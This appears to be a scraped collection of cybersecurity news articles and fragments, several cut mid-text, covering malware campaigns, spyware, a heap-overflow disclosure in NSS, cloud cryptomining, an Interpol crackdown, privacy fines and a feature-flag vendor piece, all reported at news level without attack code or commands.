significant know-how in terms of tracking specific attacker behavior, which is critical when there are different sources and advanced, persistent threats.\nThis intelligence-led security response empowers a continuous adaptive, reflexive response that leans on quantified evidence when changing and updating rules and processes. This is the only way to deal with the increasingly sophisticated attacks we’re seeing. \nThe screens went black: A real-life attack story\nGabriel talked about a real attack that he experienced while working at the Maersk. One day, about nine months after he joined, their screens went blank. Disconnecting and unplugging actions didn’t help, it was already too late and within minutes thousands of computers were rendered useless. \nThis was not an attack for financial incentives, but rather a destructive one meant to bring the Maersk to its knees. Gabriel and his team’s only choice was to rebuild, as the attackers used one-way encryption. Obviously, while rebuilding the system, cybersecurity was a major priority. Dynamic analysis was considered paramount to their efforts so that they could perform real-time analysis to empower ongoing learning and threat adaptation. Their goal was to learn what normal and abnormal internal behavior looked like, as 80% of attacks are internal. \nFollowing the attack, Gabriel came up with 4 levels of observability, health checks and a way to determine whether a system’s health has been compromised. All processes and architecture decisions were now forced through cybersecurity assessment and must pass a number of checks and balances. This doesn’t mean that all the boxes need to be ticked to get a new process or decision approved, because the main point here is to drive knowledge of your gaps and weaknesses so that you can leverage the right capabilities and vendors for your security philosophy. \nOver the last 2 years we’ve seen a growing trend of organizations adopting specific API tools that help monitor, discover and unsettle shadow APIs to better understand their risks. This is a great development, as APIs are totally different from the application world we came from. The only way to protect APIs is to adopt unique tools and processes that were built specifically for them. \nAPI security: Getting the board onboard\nThe proliferation and severity of cybersecurity attacks in our landscape are making the boards and executives of many enterprises take more interest in API protection. Increased visibility is another way to get execs to understand the risks they’re exposed to. If you can find a way to show your execs how much-unprotected data is at risk easily, you’ve won half the battle. \nThis visibility will, in turn, empower a more adaptive, reflexive cybersecurity posture that will enable you to continuously learn, draw insights and modify your posture in response to new types of attacks.\nGet this RFP template to help you simplify the process of selecting the right API security vendor for your business\nDeveloping a consistent, visible security posture across all of your enterprise assets is a central tenet to any robust cybersecurity strategy. This security posture must take into account the four pillars of the API lifecycle: Plan, Build, Operate and Retire. To do that correctly, you’ve got to choose the technologies that will enable you to enforce the policies, tools and governance that you decided upon when starting out on your API security journey.\nOf no less importance is developing a holistic, centralized strategy that empowers the visibility you need to protect your assets. Advanced ML and Deep Learning technologies delivered by innovative companies like Imvision can definitely help you achieve that.\n\n\nFound this article interesting?

{'title': 'Researchers Warn Iranian Users of Widespread SMS Phishing Campaigns',
'text': 'Socially engineered SMS messages are being used to install malware on Android devices as part of a widespread phishing campaign that impersonates the Iranian government and social security services to make away with credit card details and steal funds from victims’ bank accounts.\nUnlike other variants of banking malware that bank of overlay attacks to capture sensitive data without the knowledge of the victim, the financially motivated operation uncovered by Check Point Research is designed to trick the targets into handing over their credit card information by sending them a legitimate-looking SMS message that contains a link, which, when clicked, downloads a malware-laced app onto their devices.\n“The malicious application not only collects the victim’s credit card numbers, but also gains access to their 2FA authentication SMS, and turn[s] the victim’s device into a bot capable of spreading similar phishing SMS to other potential victims,“ Check Point researcher Shmuel Cohen said in a new report published Wednesday.\n\nThe cybersecurity firm said it uncovered several hundred different phishing Android applications that masqueraded as device tracking apps, Iranian banks, dating and shopping sites, cryptocurrency exchanges, and government-related services, with these botnets sold as a “ready-to-use mobile campaign kit“ on Telegram channels for anywhere between $50 to $150.\nThe smishing botnet’s infection chain commences with a fake notification from the Iranian Judiciary urging users to review a supposed complaint filed against the recipients of the message. The link to the complaint directs the victims to what ostensibly looks like a government website, where they are asked to enter their personal information (e.g., name, phone number, etc.) and download an Android APK file.\nOnce installed, the rogue application not only requests for invasive permissions to perform activities that are not generally associated with such government apps, it also presents a fake login screen that mimics Sana, the country’s electronic judicial notice system, and prompts the victim that they need to pay a $1 fee to proceed further.\n\nUsers opting to do so are then redirected to a fake payment page that collects the credit card information entered, while the installed app functions as a stealthy backdoor to surreptitiously steal one-time passcodes sent by the credit card company and facilitate additional theft.\nFurthermore, the malware comes with a wealth of capabilities that allow it to exfiltrate all SMS messages received by a device to an attacker-controlled server, hide its icon from the home screen to thwart attempts to remove the app, deploy additional payloads, and acquire worm-like powers to expand its attack surface and spread custom smishing messages to a list of phone numbers retrieved from the server.\n\n“This allows the actors to distribute phishing messages from the phone numbers of typical users instead of from a centralized place and not be limited to a small set of phone numbers that could be easily blocked,“ Cohen explained. “This means that technically, there are no ’malicious’ numbers that can be blocked by the telecommunication companies or traced back to the attacker.“\nMaking matters worse, the attackers behind the operation have been found to follow poor operational security (OPSEC), thereby making it possible for any third party to freely access the phone numbers, contacts, SMS messages, and the list of all the online bots hosted on their servers.\n“Stealing 2FA dynamic codes allows the actors to slowly but steadily withdraw significant amounts of money from the victims’ accounts, even in cases when due to the bank limitations each distinct operation might garner only tens of dollars,“ Cohen noted. “Together with the easy adoption of the ’botnet as a service’ business model, it should come as no surprise that the number of such applications for Android and the number of people selling them is growing.“\n\n\nFound this article interesting?

Credited with reporting the issue is Tavis Ormandy of Google Project Zero, who codenamed it “BigSig.“\n\n“NSS (Network Security Services) versions prior to 3.73 or 3.68.1 ESR are vulnerable to a heap overflow when handling DER-encoded DSA or RSA-PSS signatures,“ Mozilla said in an advisory published Wednesday. “Applications using NSS for handling signatures encoded within CMS, S/MIME, PKCS #7, or PKCS #12 are likely to be impacted.“\nNSS is a collection of open-source cryptographic computer libraries designed to enable cross-platform development of client-server applications, with support for SSL v3, TLS, PKCS #5, PKCS #7, PKCS #11, PKCS #12, S/MIME, X.509 v3 certificates, and other security standards.\n\nThe bug, the consequence of a missing bounds check that could allow the execution of arbitrary attacker-controlled code, is said to have been exploitable dating all the way back to June 2012, “The striking thing about this vulnerability is just how simple it is,“ Ormandy said in a technical write-up. “This issue demonstrates that even extremely well-maintained C/C++ can have fatal, trivial mistakes.“\n\nWhile the BigSig shortcoming doesn’t affect Mozilla’s Firefox web browser itself, email clients, PDF viewers, and other applications that rely on NSS for signature verification, such as Red Hat, Thunderbird, LibreOffice, Evolution, and Evince, are believed to be vulnerable.\n“This is a major memory corruption flaw in NSS, almost any use of NSS is affected,“ Ormandy tweeted. “If you are a vendor that distributes NSS in your products, you will most likely need to update or backport the patch.“\n\n\nFound this article interesting?

{'title': 'Hackers Increasingly Using RTF Template Injection Technique in Phishing Attacks',
'text': 'Three different state-sponsored threat actors aligned with China, India, and Russia have been observed adopting a new method called RTF (aka Rich Text Format) template injection as part of their phishing campaigns to deliver malware to targeted systems.\n“RTF template injection is a novel technique that is ideal for malicious phishing attachments because it is simple and allows threat actors to retrieve malicious content from a remote URL using an RTF file,“ Proofpoint researchers said in a new report shared with The Hacker News.\n\nAt the heart of the attack is an RTF file containing decoy content that can be manipulated to enable the retrieval of content, including malicious payloads, hosted at an external URL upon opening an RTF file. Specifically, it leverages the RTF template functionality to alter a document’s formatting properties using a hex editor by specifying a URL resource instead of an accessible file resource destination from which a remote payload may be retrieved.\n\nPut differently, the idea is that attackers can send malicious Microsoft Word documents to targeted victims that appear entirely innocuous but are designed to load malicious code via the template feature remotely. This makes the mechanism a durable and effective method when paired with phishing as an initial delivery vector, the researchers noted.\nThus when an altered RTF file is opened via Microsoft Word, the application will proceed to download the resource from the specified URL prior to displaying the lure content of the file. It’s therefore not surprising that the technique is being increasingly weaponized by threat actors to distribute malware.\n\nProofpoint said it observed Template injection RTF files linked to the APT groups DoNot Team, Gamaredon, and a Chinese-related APT actor dubbed TA423 as early as February 2021, with the adversaries utilizing the files to target entities in Pakistan, Sri Lanka, Ukraine, and those operating in the deep water energy exploration sector in Malaysia via defense-themed and other country-specific lures.\n\nWhile the DoNot Team has been suspected of carrying out cyber attacks that are aligned with Indian-state interests, Gamaredon was recently outed by Ukrainian law enforcement as an outfit connected to Russia’s Federal Security Service (FSB) with a propensity for striking public and private sector organizations in the country for harvesting classified information from compromised Windows systems for geopolitical gains.\n“The innovation by threat actors to bring this method to a new file type in RTFs represents an expanding surface area of threat for organizations worldwide,“ the researchers said. “While this method currently is used by a limited number of APT actors with a range of sophistication, the technique’s effectiveness combined with its ease of use is likely to drive its adoption further across the threat landscape.“\n\n\nFound this article interesting?

Publishing people’s private info is also prohibited under the policy, as is threatening or incentivizing others to do so,“ the company’s Safety team said in a tweet.\n\nTo that end, the policy also discourages users from sharing information such as sign-in credentials that would enable malicious actors to gain access to a person’s sensitive information without their authorization. It also forbids users from seeking financial compensation in exchange for posting (or not posting) another individual’s private information as part of blackmail schemes.\nAs part of the revised policy, the social media platform will allow individuals to request takedowns of pictures or videos featuring them with a clearly abusive intent, and violators found sharing private information and media will be prompted to remove the offending content and have their accounts temporarily locked out. Users contravening the private information policy twice will risk permanent suspension of their accounts.\nTwitter also clarified that multimedia content that shows public figures or individuals participating in large events like protests and sporting events would not violate this policy, adding it doesn’t consider people’s names and dates of birth; descriptions of physical appearance; accusations, and allegations; and screengrabs of posts and messages taken from other platforms as private unless they contain details such as a phone number.\n\nIt’s also worth pointing out that the new rule doesn’t extend to individuals when media and accompanying Tweet text are “shared in the public interest or add value to public discourse.“ But what exactly constitutes public interest remains in question, effectively giving the company ample room to exercise its own discretion.\n“There are growing concerns about the misuse of media and information that is not available elsewhere online as a tool to harass, intimidate, and reveal the identities of individuals,“ Twitter said. “Sharing personal media, such as images or videos, can potentially violate a person’s privacy, and may lead to emotional or physical harm.

A successful attack will allow an adversary to achieve various objectives, including stealing information or using the compromised machine as a beachhead for future attacks against an organization.“\n\nCVE-2021-39238’s critical severity rating also stems from that the vulnerability is wormable, meaning it could be exploited to self-propagate to other MFPs on the compromised network. \n\nA hypothetical attack scenario could involve embedding an exploit for the font-parsing flaws in a malicious PDF document and then social engineering the target into printing the file. Alternatively, an employee from the victim organization could be lured into visiting a rogue website, in the process sending the exploit to the vulnerable MFP directly from the web browser in what’s known as a cross-site printing attack.\n“The website would, automatically, remotely print a document containing a maliciously-crafted font on the vulnerable MFP, giving the attacker code execution rights on the device,“ the researchers said.\nBesides enforcing network segmentation and disabling printing from USB drives by default, it’s highly recommended for organizations using the affected devices to install the patches as soon as they become available. “While exploiting these issues is somewhat difficult, the public disclosure of these vulnerabilities will help threat actors know what to look for to attack vulnerable organizations,“ Hirvonen and Bolshev said.\n\n\nFound this article interesting?

'text': 'Government, diplomatic entities, military organizations, law firms, and financial institutions primarily located in the Middle East have been targeted as part of a stealthy malware campaign as early as 2019 by making use of malicious Microsoft Excel and Word documents.\nRussian cybersecurity company Kaspersky attributed the attacks with high confidence to a threat actor named WIRTE, adding the intrusions involved “MS Excel droppers that use hidden spreadsheets and VBA macros to drop their first stage implant,“ which is a Visual Basic Script (VBS) with functionality to amass system information and execute arbitrary code sent by the attackers on the infected machine.\nAn analysis of the campaign as well as the toolset and methods employed by the adversary has also led the researchers to conclude with low confidence that the WIRTE group has connections to another politically motivated collective called the Gaza Cybergang. The affected entities are spread across Armenia, Cyprus, Egypt, Jordan, Lebanon, Palestine, Syria, and Turkey.\n\n“WIRTE operators use simple and rather common TTPs that have allowed them to remain undetected for a long period of time,“ Kaspersky researcher Maher Yamout said. “This suspected subgroup of Gaza Cybergang used simple yet effective methods to compromise its victims with better OpSec than its suspected counterparts.“\nThe infection sequence observed by Kaspersky involves decoy Microsoft Office documents deploying Visual Basic Script (VBS), potentially delivered through spear-phishing emails that purportedly relate to Palestinian matters and other trending topics that are tailored to the targeted victims.\n\nThe Excel droppers, for their part, are programmed to execute malicious macros to download and install a next-stage implant named Ferocious on recipients’ devices, while the Word document droppers make use of VBA macros to download the same malware. Composed of VBS and PowerShell scripts, the Ferocious dropper leverages a living-off-the-land (LotL) technique called COM hijacking to achieve persistence and triggers the execution of a PowerShell script dubbed LitePower.\n\nThis LitePower, a PowerShell script, acts as a downloader and secondary stager that connects to remote command-and-control servers located in Ukraine and Estonia — some of which date back to December 2019 — and awaits further commands that could result in the deployment of additional malware on the compromised systems.\n“WIRTE modified their toolset and how they operate to remain stealthy for a longer period of time. Living-off-the-land (LotL) techniques are an interesting new addition to their TTPs,“ Yamout said. “Using interpreted language malware such as VBS and PowerShell scripts, unlike the other Gaza Cybergang subgroups, adds flexibility to update their toolset and avoid static detection controls.“\n\n\nFound this article interesting?

'text': 'Four different Android banking trojans were spread via the official Google Play Store between August and November 2021, resulting in more than 300,000 infections through various dropper apps that posed as seemingly harmless utility apps to take full control of the infected devices.\nDesigned to deliver Anatsa (aka TeaBot), Alien, ERMAC, and Hydra, cybersecurity firm ThreatFabric said the malware campaigns are not only more refined, but also engineered to have a small malicious footprint, effectively ensuring that the payloads are installed only on smartphones devices from specific regions and preventing the malware from being downloaded during the publishing process.\n\nOnce installed, these banking trojans can surreptitiously siphon user passwords and SMS-based two-factor authentication codes, keystrokes, screenshots, and even deplete users’ bank accounts without their knowledge by using a tool called Automatic Transfer System (ATSs). The apps have since been removed from the Play Store.\nThe list of malicious dropper apps is below -\nTwo Factor Authenticator (com.flowdivison)Protection Guard (com.protectionguard.app)QR CreatorScanner (com.ready.qrscanner.mix)Master Scanner Live (com.multifuction.combine.qr)QR Scanner 2021 (com.qr.code.generate)QR Scanner (com.qr.barqr.scangen)PDF Document Scanner - Scan to PDF (com.xaviermuches.docscannerpro2)PDF Document Scanner Free (com.doscanner.mobile)CryptoTracker (cryptolistapp.app.com.cryptotracker)Gym and Fitness Trainer (com.gym.trainer.jeux)\nWhile Google earlier this month instituted limitations to restrict the use of accessibility permissions that allow malicious apps to capture sensitive information from Android devices, operators of such apps are increasingly refining their tactics by other means even when forced to choose the more traditional way of installing apps through the app marketplace.\n\nChief among the techniques is a technique called versioning, wherein clean versions of the apps are first uploaded, and malicious functionalities are incrementally introduced in the form of subsequent app updates. Another tactic involves designing look-alike command-and-control (C2) websites that match the theme of the dropper app so as to slip past conventional detection methods.\nThreatFabric discovered six Anatsa droppers on the Play Store since June 2021, with the apps programmed to download an “update“ followed by prompting users to grant it Accessibility Service privileges and permissions to install apps from unknown third-party sources.\n\nBrunhilda, a threat actor which was discovered distributing a remote access trojan named Vultur in July 2021, leveraged trojanized apps masquerading as QR code creator apps to drop Hydra and ERMAC malware aimed at users in the U.S., a market previously not targeted by the two malware families.\nLastly, a fitness training dropper app with over 10,000 installations — dubbed GymDrop — was found delivering the Alien banking trojan payload by masking it as a “new package of workout exercises,“ even as its purportedly legitimate developer website doubled up as the C2 server to fetch the configuration required to download the malware.\n“To make themselves even more difficult to detect, the actors behind these dropper apps only manually activate the installation of the banking trojan on an infected device in case they desire more victims in a specific region of the world,“ the researchers said. “This makes automated detection a much harder strategy to adopt by any organization.“\n\n\nFound this article interesting?

{'title': 'New Chinotto Spyware Targets North Korean Defectors, Human Rights Activists',
'text': 'North Korean defectors, journalists who cover North Korea-related news, and entities in South Korea are being zeroed in on by a nation-state-sponsored advanced persistent threat (APT) as part of a new wave of highly-targeted surveillance attacks.\nRussian cybersecurity firm Kaspersky attributed the infiltrations to a North Korean hacker group tracked as ScarCruft, also known as APT37, Reaper Group, InkySquid, and Ricochet Chollima.\n“The actor utilized three types of malware with similar functionalities: versions implemented in PowerShell, Windows executables and Android applications,“ the company’s Global Research and Analysis Team (GReAT) said in a new report published today. “Although intended for different platforms, they share a similar command and control scheme based on HTTP communication. Therefore, the malware operators can control the whole malware family through one set of command and control scripts.“\n\nLikely active since at least 2012, ScarCruft is known for targeting public and private sectors situated in South Korea with an aim to plunder sensitive information stored in the compromised systems, and has been previously observed using a Windows-based backdoor called RokRAT.\nThe primary initial infection vector used by APT37 is spear-phishing, in which the actor sends an email to a target that is weaponized with a malicious document. In August 2021, the threat actor was unmasked using two exploits in the Internet Explorer web browser to infect victims with a custom implant known as BLUELIGHT by staging a watering hole attack against a South Korean online newspaper.\n\nThe case investigated by Kaspersky is both similar and different in some ways. The actor reached out to the victim’s associates and acquaintances using stolen Facebook account credentials to establish initial contact, only to follow it up with a spear-phishing email enclosing a password-protected RAR archive that includes a Word document. This decoy document claims to be about “North Korea’s latest situation and our national security.“\nOpening the Microsoft Office document triggers the execution of a macro and the decryption of the next-stage payload embedded within the document. The payload, a Visual Basic Application (VBA), contains a shellcode that, in turn, retrieves from a remote server the final-stage payload with backdoor capabilities.\n\nAdditional techniques uncovered by GReAT on one of the infected victims show that post its breach on March 22, 2021, the operators managed to collect screenshots for a period of two months between August and September, before deploying a fully-featured malware called Chinotto in late August to control the device and exfiltrate sensitive information to a command-and-control (C2) server.\n\nWhat’s more, Chinotto comes with its own Android variant to achieve the same goal of spying on its users. The malicious APK file, delivered to the recipients via a smishing attack, prompts users to grant it a wide range of permissions during the installation phase, enabling the app to amass contact lists, messages, call logs, device information, audio recordings, and data stored in apps such as Huawei Drive, Tencent WeChat (aka Weixin), and KakaoTalk.\nKaspersky said it worked with South Korea’s emergency response teams to take down ScarCruft’s attack infrastructure, adding it traced the roots of Chinotto in PoorWeb, a backdoor previously attributed to use by the APT group.\n“Many journalists, defectors and human rights activists are targets of sophisticated cyberattacks,“ the researchers said. “Unlike corporations, these targets typically don’t have sufficient tools to protect against and respond to highly skilled surveillance attacks.“\n\n\nFound this article interesting?

{'title': 'Hackers Using Compromised Google Cloud Accounts to Mine Cryptocurrency',
'text': 'Threat actors are exploiting improperly-secured Google Cloud Platform (GCP) instances to download cryptocurrency mining software to the compromised systems as well as abusing its infrastructure to install ransomware, stage phishing campaigns, and even generate traffic to YouTube videos for view count manipulation.\n“While cloud customers continue to face a variety of threats across applications and infrastructure, many successful attacks are due to poor hygiene and a lack of basic control implementation,“ Google’s Cybersecurity Action Team (CAT) outlined as part of its recent Threat Horizons report published last week.\n\nOf the 50 recently compromised GCP instances, 86% of them were used to conduct cryptocurrency mining, in some cases within 22 seconds of successful breach, while 10% of the instances were exploited to perform scans of other publicly accessible hosts on the Internet to identify vulnerable systems, and 8% of the instances were used to strike other entities. About 6% of the GCP instances were used to host malware.\nIn most cases, the unauthorized access was attributed to the use of weak or no passwords for user accounts or API connections (48%), vulnerabilities in third-party software installed on the cloud instances (26%), and leakage of credentials in GitHub projects (4%).\n\nAnother attack of note was a Gmail phishing campaign launched by APT28 (aka Fancy Bear) towards the end of September 2021 that involved sending an email blast to over 12,000 account holders primarily in the U.S., U.K., India, Canada, Russia, Brazil, and the E.U. nations with the goal of stealing their credentials.\nFurthermore, Google CAT said it observed adversaries abusing free Cloud credits by using trial projects and posing as fake startups to engage in traffic pumping to YouTube. In a separate incident, a North Korean government-backed attacker group masqueraded as Samsung recruiters to send fake job opportunities to employees at several South Korean information security companies that sell anti-malware solutions.\n\n“The emails included a PDF allegedly claiming to be of a job description for a role at Samsung; however, the PDFs were malformed and did not open in a standard PDF reader,“ the researchers said. “When targets replied that they could not open the job description, attackers responded with a malicious link to malware purporting to be a ’Secure PDF Reader’ stored in Google Drive which has now been blocked.“\n\nGoogle connected the attacks to the same threat actor that previously set its sights on security professionals working on vulnerability research and development earlier this year to steal exploits and stage further attacks on vulnerable targets of their choice.\n“Cloud-hosted resources have the benefit of high availability and ’anywhere, anytime’ access,“ Google CAT said. “While cloud-hosted resources streamline workforce operations, bad actors can try to take advantage of the ubiquitous nature of the cloud to compromise cloud resources. Despite growing public attention to cybersecurity, spear-phishing and social engineering tactics are frequently successful.“\n\n\nFound this article interesting?

'text': 'A joint four-month operation coordinated by Interpol, the international criminal police organization, has culminated in the arrests of more than 1,000 cybercriminals and the recovery of $27 million in illicit proceeds.\nCodenamed “HAECHI-II,“ the crackdown enabled law enforcement units from across 20 countries, as well as Hong Kong and Macao, close 1,660 cases alongside blocking 2,350 bank accounts linked to the fraudulent illicit funds amassed from a range of online financial crimes, such as romance scams, investment fraud, and money laundering associated with illegal online gambling.\n“The results of Operation HAECHI-II show that the surge in online financial crime generated by the COVID-19 pandemic shows no signs of waning,“ said Interpol Secretary General Jürgen Stock in a press statement issued on November 26.\n\nThe coordinated law enforcement probe took place over a period of four months, starting from June 2021 until September 2021, with ten new criminal modus operandi identified throughout the course of the operation.\nIn one instance of a sophisticated business email compromise (BEC) scam, the criminals impersonated the legal representative of an unnamed Colombian textiles company to illegally authorize the transfer of more than $16 million to two Chinese bank accounts. The firm alerted the authorities but not after finding itself defrauded of more than $8 million. \nA second case concerned a Slovenian company that was tricked into transferring more than $800,000 to money mule accounts in China. In both the incidents, the money was intercepted and the stolen funds returned.\nWhat’s more, in yet another example of how threat actors quickly seize on popular trends for opportunistic exploitation, Interpol also said it uncovered a malware campaign that leveraged the hit South Korean Netflix show Squid Game to distribute a trojan that subscribed victims to paid premium services without their explicit approval.\nCybersecurity firm Proofpoint, late last month, disclosed another phishing attack that involved the cybercrime actor TA575 distributing Dridex malware using Squid Game lures. “The threat actor is purporting to be entities associated with the Netflix global phenomenon using emails enticing targets to get early access to a new season of Squid Game or to become a part of the TV show casting,“ the researchers noted.\n\nParticipating countries in HAECHI-II included Angola, Brunei, Cambodia, Colombia, China, India, Indonesia, Ireland, Japan, Korea (Rep. of), Laos, Malaysia, Maldives, the Philippines, Romania, Singapore, Slovenia, Spain, Thailand, and Vietnam.\nThe arrests are part of a three-year project to tackle cyber-enabled financial crime, and follow the first wave of the operation — dubbed “HAECHI-I“ — conducted between September 2020 and March 2021. The investigation, which involved a subset of the aforementioned countries, saw 585 individuals apprehended and more than 1,600 bank accounts around the world frozen, while also intercepting $83 million in illicit funds transferred from victims to the perpetrators.\n\n\nFound this article interesting?

'text': 'Italy’s antitrust regulator has fined both Apple and Google €10 million each for what it calls are “aggressive“ data practices and for not providing consumers with clear information on commercial uses of their personal data during the account creation phase.\nThe Autorità Garante della Concorrenza e del Mercato (AGCM) said “Google and Apple did not provide clear and immediate information on the acquisition and use of user data for commercial purposes,“ adding the tech companies chose to emphasize the data collection as only necessary to improve their own services and personalize user experience without offering any indication that the data could be transferred and used for other reasons.\nThe concerns have to do with how the companies omit relevant information when creating an account and using their services, details which the authority said are critical to making an informed decision as to whether or not to give permission for utilizing their data for commercial intent.\n\nThe lack of express user consent, the AGCM argued, not only pre-sets users’ acceptance but also enables Apple and Google to subject the generated data to other kinds of processing without providing a mechanism by which consumers can confirm or change their choice on sharing their personal data.\n“This acquisition architecture, prepared by Apple, does not make it possible to exercise one’s will on the use of one’s data for commercial purposes,“ the regulator noted. “Therefore, the consumer is conditioned in the choice of consumption and undergoes the transfer of personal information, which Apple can dispose of for its own promotional purposes carried out in different ways.“\nGoogle to Address Concerns with Privacy Sandbox\n\nThe development also comes as the U.K.’s Competition and Markets Authority (CMA) announced on Friday that it has secured further oversight into Google’s ongoing development of Privacy Sandbox proposals to move away from third-party cookies in its Chrome web browser in the wake of severe backlash from privacy advocates, advertisers and publishers.\nTo that end, the CMA said that the search giant has offered to “address concerns about Google removing functionality or information before the full Privacy Sandbox changes, including by delaying enforcement of its Privacy Budget proposal, and offering commitments around the introduction of measures to reduce access to IP addresses.“\n\nIn addition, Google is also expected to “clarify the internal limits on the data“ that the company itself can use, which involves placing restrictions to prevent the use of “first-party personal data to track users for targeting and measurement of ads shown on non-Google websites“ as well as leverage users’ Chrome browsing history and Analytics data for targeting ads on Google or non-Google websites.\nThe move follows Google’s earlier announcement in June to delay the rollout from early 2022 to late 2023, noting that “more time is needed across the ecosystem to get this right“ and “evaluate the new technologies, gather feedback and iterate to ensure they meet our goals for both privacy and performance, and give all developers time to follow the best path for privacy.“\n\n\nFound this article interesting?

{'title': 'Hackers Targeting Biomanufacturing Facilities With Tardigrade Malware',
'text': 'An advanced persistent threat (APT) has been linked to cyberattacks on two biomanufacturing companies that occurred this year with the help of a custom malware loader called “Tardigrade.“\nThat’s according to an advisory published by Bioeconomy Information Sharing and Analysis Center (BIO-ISAC) this week, which noted that the malware is actively spreading across the sector with the likely goal of perpetrating intellectual property theft, maintaining persistence for extended periods of time, and infecting the systems with ransomware.\n\nBIO-ISAC, which commenced an investigation following a ransomware attack targeting an unnamed biomanufacturing facility earlier this spring, characterized Tardigrade as a sophisticated piece of malware with “a high degree of autonomy as well as metamorphic capabilities.“ The same malware was then used to strike a second entity in October 2021.\nThe “actively spreading“ intrusions have not been attributed to a specific threat actor or a nation, but the agency told The Hill that the efforts mirrored previous attacks by a hacking group linked to Russia.\n\nSpread via phishing emails or infected USB drives, Tardigrade is an advanced offshoot of SmokeLoader, a Windows-based backdoor operated by a group known as Smoky Spider and available for sale on underground markets dating all the way back to 2011, with the former possessing capabilities to capture keystrokes, laterally move across the compromised network, and escalate privileges.\n\nWhat’s more, the malware acts as an entry point for additional malware payloads and is engineered to operate autonomously even when cut off from its command-and-control server to carry out its malicious activities. Organizations in the biomanufacturing industry are advised to apply software updates, enforce network segmentation, and test offline backups of critical biological infrastructure to mitigate the threats.\n“This malware is extremely difficult to detect due to metamorphic behavior. Vigilance on key personnel corporate computers is important,“ the researchers said, adding “Many machines in the sector use outdated operating systems.

'text': 'A new malware campaign has been discovered targeting cryptocurrency, non-fungible token (NFT), and DeFi aficionados through Discord channels to deploy a crypter named “Babadeda“ that’s capable of bypassing antivirus solutions and stage a variety of attacks.\n“[T]his malware installer has been used in a variety of recent campaigns to deliver information stealers, RATs, and even LockBit ransomware,“ Morphisec researchers said in a report published this week. The malware distribution attacks are said to have commenced in May 2021.\n\nCrypters are a type of software used by cybercriminals that can encrypt, obfuscate, and manipulate malicious code so as to appear seemingly innocuous and make it harder to detect by security programs — a holy grail for malware authors.\nThe infiltrations observed by Morphisec involved the threat actor sending decoy messages to prospective users on Discord channels related to blockchain-based games such as Mines of Dalarnia, urging them to download an application. Should a victim click a URL embedded within the message, the individual is directed to a phishing domain designed to resemble the game’s legitimate website and includes a link to a malicious installer containing the Babadeda crypter.\n\nUpon execution, the installer triggers an infection sequence that decodes and loads the encrypted payload, in this case BitRAT and Remcos, to harvest valuable information.\n\nMorphisec attributed the attacks to a threat actor from a Russian-speaking country, owing to the Russian language text displayed on one of the decoy sites. As many as 84 malicious domains, created between July 24, 2021, and November 17, 2021, have been identified to date.\n“Targeting cryptocurrency users through trusted attack vectors gives its distributors a fast-growing selection of potential victims,“ the researchers said. “Once on a victim’s machine, masquerading as a known application with a complex obfuscation also means that anyone relying on signature-based malware effectively has no way of knowing Babadeda is on their machine — or of stopping it from executing.“\n\n\nFound this article interesting?

'text': 'Researchers have unearthed a new remote access trojan (RAT) for Linux that employs a never-before-seen stealth technique that involves masking its malicious actions by scheduling them for execution on February 31st, a non-existent calendar day.\nDubbed CronRAT, the sneaky malware “enables server-side Magecart data theft which bypasses browser-based security solutions,“ Sansec Threat Research said. The Dutch cybersecurity firm said it found samples of the RAT on several online stores, including an unnamed country’s largest outlet.\n\nCronRAT’s standout feature is its ability to leverage the cron job-scheduler utility for Unix to hide malicious payloads using task names programmed to execute on February 31st. Not only does this allow the malware to evade detection from security software, but it also enables it to launch an array of attack commands that could put Linux eCommerce servers at risk.\n“The CronRAT adds a number of tasks to crontab with a curious date specification: 52 23 31 2 3,“ the researchers explained. “These lines are syntactically valid, but would generate a run time error when executed. However, this will never happen as they are scheduled to run on February 31st.“\n\nThe RAT — a “sophisticated Bash program“ — also uses many levels of obfuscation to make analysis difficult, such as placing code behind encoding and compression barriers, and implementing a custom binary protocol with random checksums to slip past firewalls and packet inspectors, before establishing communications with a remote control server to await further instructions.\n\nArmed with this backdoor access, the attackers associated with CronRAT can run any code on the compromised system, the researchers noted.\n“Digital skimming is moving from the browser to the server and this is yet another example,“ Sansec’s Director of Threat Research, Willem de Groot, said. “Most online stores have only implemented browser-based defenses, and criminals capitalize on the unprotected back-end. Security professionals should really consider the full attack surface.“\n\n\nFound this article interesting? Follow THN on Facebook, Twitter  and LinkedIn to read more exclusive content we post.',

In curtailing the exports, the move effectively makes it harder for local cybersecurity firms to market their software to countries with totalitarian regimes or with a track record of perpetrating human rights abuses.\nThe move comes close on the heels of the U.S. Commerce Department adding NSO Group and Candiru to its trade blocklist for developing and supplying sophisticated interception or intrusion capabilities to foreign governments that then used the spy tools to strike journalists, activists, dissidents, academics, and government officials across the world.\nEarlier this week, Apple followed with its own salvo, filing a lawsuit against NSO Group and its parent company Q Cyber Technologies for illegally targeting its users with Pegasus, a military-grade spyware that’s designed to harvest sensitive personal and geolocation information and surreptitiously activate the phones’ cameras and microphones.\n\n“By marketing to [U.S./NATO adversaries], these firms signal that they are willing to accept or ignore the risk that their products may bolster the capabilities of authoritarian and/or adversary governments, which may use their products to target vulnerable populations within their country or conduct foreign espionage more effectively,“ Atlantic Council said in a report published earlier this month detailing the proliferation of the cyber-surveillance industry.\n\n\nFound this article interesting?

{'title': 'Product Releases Should Not Be Scary',
'text': 'Every Product Manager and Software Developer should know that pushing feature updates to production via traditional channels is as archaic as painting on cave walls. The smart are always quick to adapt to new, innovative technologies, and this mindset is exactly what makes normal companies great.\nThe landscape is changing fast, especially in IT. Change isn’t just necessary, but more often than not, it’s the single-most-important variable that determines a company’s chances of survival. The fact of the matter is that NOT using Feature Flags leads to a more cumbersome, expensive, and slower type of rollout.\nSimply put, it makes your project less competitive with those that have their deployments better organized, and that’s an edge that you can’t afford to lose.\n\nFeature Flags are changing how things work\nMany companies are using Feature Flags these days, and for good measure. It’s safer and allows for more granular control over what you’re building. It almost always ends up saving you money down the line, especially when calculating how many more working hours your team would have to put in otherwise.\nMessy deployments are a thing of the past for many companies already, and it’s high time that your organization joins in on the innovation as well.\n\nConfigCat is an all-in-one hosted service solution for Feature Flag and Configuration Management.\nIn a nutshell, ConfigCat is a company that seems to provide a functional solution to everything that’s been described above. It allows you to separate actual code deployments from feature releases, as well as many other things.\nYou get control over nice things like easily turning features on and off without actually touching code, the ability to release changes to only certain chunks of your user demographic, to do A/B tests on things before a mass rollout (to see how those changes perform), and other juicy things of this sort that would make any project manager sleep well at night.\nWhat’s their deal, exactly?\nFeature Flags aren’t by any means a new thing; they’ve actually been around for quite a while now. In fact, I’d be hard-pressed to find any companies worth their salt who don’t use Feature Flags, at least to an extent. Facebook and Google are especially notorious for their extremely slow phased rollout of new features. Percentage-based rollouts like those would be a hellish task to 